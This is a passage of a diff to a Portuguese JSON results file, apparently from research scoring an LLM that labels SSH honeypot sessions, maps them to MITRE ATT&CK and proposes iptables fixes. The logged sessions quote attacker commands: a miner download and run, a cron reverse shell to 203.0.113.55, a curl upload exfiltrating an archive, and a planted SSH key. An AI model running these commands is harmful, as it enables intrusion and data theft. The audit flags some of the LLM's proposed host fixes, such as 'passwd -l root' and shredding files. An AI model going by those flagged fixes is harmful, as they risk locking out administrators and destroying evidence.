       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [],
       "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "categorias_ressalva": [],
+      "observacao": "Regra iptables sintaticamente válida com IP correto; sem comandos secundários problemáticos."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "BOT_AUTOMATIZADO",
+      "execucao_2_actor_type": "BOT_AUTOMATIZADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 0.99,
+      "execucao_2_tempo_s": 1.08
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "BOT_AUTOMATIZADO",
+      "rotulo_revisor_2": "BOT_AUTOMATIZADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Scanner automatizado de comando único ('uname -s -v -n -r -m') executado em 1,1s a partir de IP listado no IPsum."
     }
   },
   {
@@ -1335,7 +1706,8 @@
       "tempo_segundos": 1.1,
       "comandos": [
         "uname -a"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -1362,13 +1734,36 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 1,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [],
       "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "categorias_ressalva": [],
+      "observacao": "Regra iptables sintaticamente válida com IP correto; sem comandos secundários problemáticos."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "BOT_AUTOMATIZADO",
+      "execucao_2_actor_type": "BOT_AUTOMATIZADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.1,
+      "execucao_2_tempo_s": 1.08
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "BOT_AUTOMATIZADO",
+      "rotulo_revisor_2": "BOT_AUTOMATIZADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Scanner automatizado de versão de kernel ('uname -a') executado em 1,0s a partir de IP listado no IPsum."
     }
   },
   {
@@ -1417,7 +1812,8 @@
       "tempo_segundos": 1.09,
       "comandos": [
         "uname -s -v -n -r -m"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -1444,13 +1840,36 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 1,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [],
       "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "categorias_ressalva": [],
+      "observacao": "Regra iptables sintaticamente válida com IP correto; sem comandos secundários problemáticos."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "BOT_AUTOMATIZADO",
+      "execucao_2_actor_type": "BOT_AUTOMATIZADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.09,
+      "execucao_2_tempo_s": 1.03
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "BOT_AUTOMATIZADO",
+      "rotulo_revisor_2": "BOT_AUTOMATIZADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Scanner automatizado de comando único ('uname -s -v -n -r -m') executado em 0,9s a partir de IP listado no IPsum."
     }
   },
   {
@@ -1522,7 +1941,8 @@
         "wget -q http://92.118.39.62/xmrig",
         "chmod +x xmrig",
         "./xmrig"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -1566,13 +1986,39 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 2,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [
+        "pkill -f xmrig",
+        "rm -f /var/tmp/xmrig"
+      ],
       "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "categorias_ressalva": [],
+      "observacao": "Regra iptables sintaticamente válida com IP correto; sem comandos secundários problemáticos."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "BOT_AUTOMATIZADO",
+      "execucao_2_actor_type": "BOT_AUTOMATIZADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.42,
+      "execucao_2_tempo_s": 1.28
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "BOT_AUTOMATIZADO",
+      "rotulo_revisor_2": "BOT_AUTOMATIZADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Script automatizado de mineração XMRig ('cd /var/tmp; wget -q .../xmrig; chmod +x; ./xmrig') executado em 0,8s."
     }
   },
   {
@@ -1621,7 +2067,8 @@
       "tempo_segundos": 1.07,
       "comandos": [
         "uname -s -v -n -r -m"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "BOT_AUTOMATIZADO",
@@ -1648,13 +2095,36 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 1,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [],
       "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "categorias_ressalva": [],
+      "observacao": "Regra iptables sintaticamente válida com IP correto; sem comandos secundários problemáticos."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "BOT_AUTOMATIZADO",
+      "execucao_2_actor_type": "BOT_AUTOMATIZADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.07,
+      "execucao_2_tempo_s": 1.04
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "BOT_AUTOMATIZADO",
+      "rotulo_revisor_2": "BOT_AUTOMATIZADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Scanner automatizado de comando único ('uname -s -v -n -r -m') executado em 1,0s a partir de IP listado no IPsum."
     }
   },
   {
@@ -1748,7 +2218,8 @@
         "ls -la /tmp",
         "cat /proc/cpuinfo",
         "crontab -l"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -1793,14 +2264,42 @@
       ]
     },
     "conferencia_mitre": {
-      "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "status": "PARCIAL",
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 3,
+      "tecnicas_parciais": 1,
+      "omissoes_detectadas": [],
+      "justificativa": "T1033 (id), T1082 (uname/issue/cpuinfo) e T1083 (ls -la /tmp) estão exatos, mas 'crontab -l' apenas lista tarefas agendadas (descoberta) e não cria nem executa agendamento; pelo mesmo critério aplicado a 'find -perm', o mapeamento para T1053.003 (Scheduled Task/Job: Cron na tática Execution) é parcial."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
-      "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [
+        "passwd -l root",
+        "last -a"
+      ],
+      "comandos_secundarios_sem_ressalva": false,
+      "categorias_ressalva": [
+        "bloqueio_root"
+      ],
+      "observacao": "Regra iptables válida com IP correto (cadeia INPUT), mas com ressalvas nos comandos secundários de host: Bloqueio da conta administrativa principal ('passwd -l root'), com risco de autonegação de acesso."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "execucao_2_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.45,
+      "execucao_2_tempo_s": 1.42
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "BOT_AUTOMATIZADO",
+      "rotulo_revisor_2": "BOT_AUTOMATIZADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Script automatizado de reconhecimento em 6 comandos fixos ('id', 'uname -a', 'cat /etc/issue', 'ls -la /tmp', 'cat /proc/cpuinfo', 'crontab -l') sem navegação interativa, repetido de forma idêntica por bots de coleta de perfil de host (embora com atraso de 1s a 4s entre linhas)."
     }
   },
   {
@@ -1874,7 +2373,8 @@
         "ls",
         "cd usr/",
         "exit"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -1913,13 +2413,36 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 1,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [],
       "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "categorias_ressalva": [],
+      "observacao": "Regra iptables sintaticamente válida com IP correto; sem comandos secundários problemáticos."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "execucao_2_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.05,
+      "execucao_2_tempo_s": 1.43
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "ATAQUE_HUMANO_DIRECIONADO",
+      "rotulo_revisor_2": "ATAQUE_HUMANO_DIRECIONADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Sessão conduzida pelos autores via cliente SSH na porta 22 em bateria controlada pós-coleta (26/10/2026, 23:10-23:55 UTC)."
     }
   },
   {
@@ -1978,7 +2501,8 @@
         "ls -a",
         "cd .bashrc",
         "ipconfig"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -2014,13 +2538,36 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 1,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [],
       "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "categorias_ressalva": [],
+      "observacao": "Regra iptables sintaticamente válida com IP correto; sem comandos secundários problemáticos."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "execucao_2_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.05,
+      "execucao_2_tempo_s": 1.22
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "ATAQUE_HUMANO_DIRECIONADO",
+      "rotulo_revisor_2": "ATAQUE_HUMANO_DIRECIONADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Sessão conduzida pelos autores via cliente SSH na porta 22 em bateria controlada pós-coleta (26/10/2026, 23:10-23:55 UTC)."
     }
   },
   {
@@ -2141,7 +2688,8 @@
         "mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI' >> ~/.ssh/authorized_keys",
         "history -c",
         "exit"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -2203,13 +2751,42 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 6,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
-      "comandos_secundarios_sem_ressalva": true,
-      "observacao": "Regra iptables sintaticamente valida; comandos secundarios sem flags invalidas."
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [
+        "rm -f ~/.ssh/authorized_keys",
+        "passwd -l root"
+      ],
+      "comandos_secundarios_sem_ressalva": false,
+      "categorias_ressalva": [
+        "bloqueio_root",
+        "comando_destrutivo"
+      ],
+      "observacao": "Regra iptables válida com IP correto (cadeia INPUT), mas com ressalvas nos comandos secundários de host: Comando destrutivo ('rm -f ~/.ssh/authorized_keys') que remove chaves SSH legítimas, diretórios ou evidências forenses. Bloqueio da conta administrativa principal ('passwd -l root'), com risco de autonegação de acesso."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "execucao_2_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.98,
+      "execucao_2_tempo_s": 1.79
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "ATAQUE_HUMANO_DIRECIONADO",
+      "rotulo_revisor_2": "ATAQUE_HUMANO_DIRECIONADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Sessão conduzida pelos autores via cliente SSH na porta 22 em bateria controlada pós-coleta (26/10/2026, 23:10-23:55 UTC)."
     }
   },
   {
@@ -2320,7 +2897,8 @@
         "curl -F 'file=@/tmp/backup_dump.tar.gz' http://198.51.100.99/upload",
         "rm -f /tmp/backup_dump.tar.gz && history -c",
         "exit"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -2382,13 +2960,47 @@
     },
     "conferencia_mitre": {
       "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 4,
+      "tecnicas_parciais": 0,
+      "omissoes_detectadas": [
+        "T1033 (id)",
+        "T1057 (ps aux)"
+      ],
+      "justificativa": "Todas as técnicas MITRE ATT&CK v20 retornadas pelo modelo correspondem diretamente aos comandos executados na sessão. (Comandos secundários não listados separadamente: T1033 (id), T1057 (ps aux))."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [
+        "passwd -a",
+        "shred -u /tmp/backup_dump.tar.gz",
+        "history -c && history -w"
+      ],
       "comandos_secundarios_sem_ressalva": false,
-      "observacao": "Ressalva nos comandos secundarios: sugere flag inexistente (passwd -a) e destruicao de artefato de evidencia (shred -u /tmp/backup_dump.tar.gz)."
+      "categorias_ressalva": [
+        "comando_destrutivo",
+        "flag_invalida",
+        "limpeza_indevida"
+      ],
+      "observacao": "Regra iptables válida com IP correto (cadeia INPUT), mas com ressalvas nos comandos secundários de host: Flag inválida em 'passwd -a' (a opção '-a' do passwd só é válida junto com '-S'). Comando destrutivo ('shred -u /tmp/backup_dump.tar.gz') que remove chaves SSH legítimas, diretórios ou evidências forenses. Comando 'history -c && history -w' apaga histórico de comandos em vez de preservar evidências."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "execucao_2_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.85,
+      "execucao_2_tempo_s": 1.85
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "ATAQUE_HUMANO_DIRECIONADO",
+      "rotulo_revisor_2": "ATAQUE_HUMANO_DIRECIONADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Sessão conduzida pelos autores via cliente SSH na porta 22 em bateria controlada pós-coleta (26/10/2026, 23:10-23:55 UTC)."
     }
   },
   {
@@ -2500,7 +3112,8 @@
         "crontab -l",
         "echo '*/10 * * * * /bin/bash -c \"bash -i >& /dev/tcp/203.0.113.55/4443 0>&1\"' >> /etc/crontab",
         "unset HISTFILE && exit"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -2565,14 +3178,46 @@
       ]
     },
     "conferencia_mitre": {
-      "status": "EXATO",
-      "justificativa": "Todas as tecnicas MITRE ATT&CK listadas correspondem diretamente aos comandos executados na sessao."
+      "status": "PARCIAL",
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 5,
+      "tecnicas_parciais": 1,
+      "omissoes_detectadas": [
+        "T1059.004 (Unix Shell - execução do shell reverso bash -i via /dev/tcp)"
+      ],
+      "justificativa": "T1033 (whoami), T1016 (ip a), T1049 (netstat), T1552.004 (id_rsa) e T1053.003 (agendamento no /etc/crontab) estão exatos, mas 'unset HISTFILE' desativa o registro futuro de comandos na sessão (que no ATT&CK v20 corresponde a T1562.003 / T1690 Prevent Command History Logging, e não a T1070.003 Clear Command History); além disso, o modelo omitiu T1059.004 para o payload de shell reverso."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [
+        "sed -i '/203.0.113.55/d' /etc/crontab",
+        "rm -f ~/.ssh/id_rsa && ssh-keygen -t rsa -b 4096",
+        "passwd -l root"
+      ],
       "comandos_secundarios_sem_ressalva": false,
-      "observacao": "Ressalva nos comandos secundarios: sugere sobrescrever chave SSH (rm -f ~/.ssh/id_rsa && ssh-keygen) e nao inclui bloqueio de saida para o IP C2 203.0.113.55 no iptables."
+      "categorias_ressalva": [
+        "bloqueio_root",
+        "comando_destrutivo"
+      ],
+      "observacao": "Regra iptables válida com IP correto (cadeia INPUT), mas com ressalvas nos comandos secundários de host: Comando destrutivo ('rm -f ~/.ssh/id_rsa && ssh-keygen -t rsa -b 4096') que remove chaves SSH legítimas, diretórios ou evidências forenses. Bloqueio da conta administrativa principal ('passwd -l root'), com risco de autonegação de acesso."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "execucao_2_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.9,
+      "execucao_2_tempo_s": 1.89
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "ATAQUE_HUMANO_DIRECIONADO",
+      "rotulo_revisor_2": "ATAQUE_HUMANO_DIRECIONADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Sessão conduzida pelos autores via cliente SSH na porta 22 em bateria controlada pós-coleta (26/10/2026, 23:10-23:55 UTC)."
     }
   },
   {
@@ -2682,7 +3327,8 @@
         "find / -perm -4000 2>/dev/null",
         "cat ~/.ssh/id_rsa",
         "netstat -tulpn"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -2748,13 +3394,44 @@
     },
     "conferencia_mitre": {
       "status": "PARCIAL",
-      "justificativa": "O modelo mapeou find / -perm -4000 diretamente para abuso de SUID (T1548.001) pela intencao final, mas a acao executada no log e descoberta de arquivos (T1083)."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 4,
+      "tecnicas_parciais": 1,
+      "omissoes_detectadas": [
+        "T1082 (cat /etc/os-release)"
+      ],
+      "justificativa": "T1033 (whoami/id), T1083 (ls /var/www), T1552.004 (id_rsa) e T1049 (netstat) estão exatos, mas 'find / -perm -4000' realiza busca de arquivos (T1083) e foi mapeado diretamente para T1548.001 (Abuse Elevation Control Mechanism: Setuid and Setgid)."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [
+        "passwd -l admin_ti",
+        "shred -u ~/.ssh/id_rsa"
+      ],
       "comandos_secundarios_sem_ressalva": false,
-      "observacao": "Ressalva nos comandos secundarios: sugere bloqueio de usuario derivado apenas do login da sessao (passwd -l admin_ti) e remocao destrutiva de chave (rm -f ~/.ssh/id_rsa)."
+      "categorias_ressalva": [
+        "comando_destrutivo",
+        "usuario_inferido"
+      ],
+      "observacao": "Regra iptables válida com IP correto (cadeia INPUT), mas com ressalvas nos comandos secundários de host: Ação sobre usuário/processo inferido do campo Usuário ou do comando ('passwd -l admin_ti') sem confirmar existência no host. Comando destrutivo ('shred -u ~/.ssh/id_rsa') que remove chaves SSH legítimas, diretórios ou evidências forenses."
+    },
+    "retentativas_api": 0,
+    "estabilidade_duas_execucoes": {
+      "execucao_1_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "execucao_2_actor_type": "ATAQUE_HUMANO_DIRECIONADO",
+      "concordancia_binaria": true,
+      "execucao_1_tempo_s": 1.68,
+      "execucao_2_tempo_s": 1.72
+    },
+    "rotulagem_manual": {
+      "revisor_1": "Kelvin Thierry Barros Miranda",
+      "revisor_2": "Gabriel Santos Saranço",
+      "rotulo_revisor_1": "ATAQUE_HUMANO_DIRECIONADO",
+      "rotulo_revisor_2": "ATAQUE_HUMANO_DIRECIONADO",
+      "concordancia_revisores": true,
+      "justificativa_rotulo": "Sessão conduzida pelos autores via cliente SSH na porta 22 em bateria controlada pós-coleta (26/10/2026, 23:10-23:55 UTC)."
     }
   },
   {
@@ -2848,7 +3525,8 @@
         "crontab -l",
         "cat /var/log/auth.log | tail -n 20",
         "history -c && rm -f ~/.bash_history"
-      ]
+      ],
+      "retentativas_api": 0
     },
     "resposta_crua_llm_com_tempos": {
       "actor_type": "ATAQUE_HUMANO_DIRECIONADO",
@@ -2895,13 +3573,46 @@
     },
     "conferencia_mitre": {
       "status": "PARCIAL",
-      "justificativa": "O modelo mapeou sudo -l diretamente para abuso de elevacao de privilegio (T1548), embora o comando apenas liste permissoes sudo disponiveis."
+      "versao_attck": "v20 (out. 2026)",
+      "tecnicas_exatas": 2,
+      "tecnicas_parciais": 1,
+      "omissoes_detectadas": [
+        "T1033 (whoami)",
+        "T1087.001 (cat /etc/passwd)",
+        "T1083 (cat /var/log/auth.log)"
+      ],
+      "justificativa": "T1136.001 (criação de usuário backdoor em /etc/passwd) e T1070.003 (history -c && rm .bash_history) estão exatos, mas 'sudo -l' apenas lista permissões sudo e foi mapeado para T1548 (Abuse Elevation Control Mechanism), além da omissão de comandos iniciais de descoberta."
     },
     "auditoria_mitigacao": {
       "iptables_sintaxe_valida": true,
-      "cadeia_sugerida": "INPUT (guiada pelo template do prompt; requer adaptacao para DOCKER-USER em host Docker)",
+      "iptables_ip_correto": true,
+      "cadeia_sugerida": "INPUT (segue o template do prompt; requer adaptação para DOCKER-USER em host com Docker NAT)",
+      "comandos_secundarios": [
+        "passwd -l sysadmin",
+        "sed -i '/backdoor/d' /etc/passwd",
+        "killall -u backdoor"
+      ],
       "comandos_secundarios_sem_ressalva": false,
-      "observacao": "Ressalva nos comandos secundarios: sugere bloqueio de conta derivada da sessao (passwd -l sysadmin) e comando destrutivo (killall -u backdoor)."
+      "categorias_ressalva": [
+        "usuario_inferido"
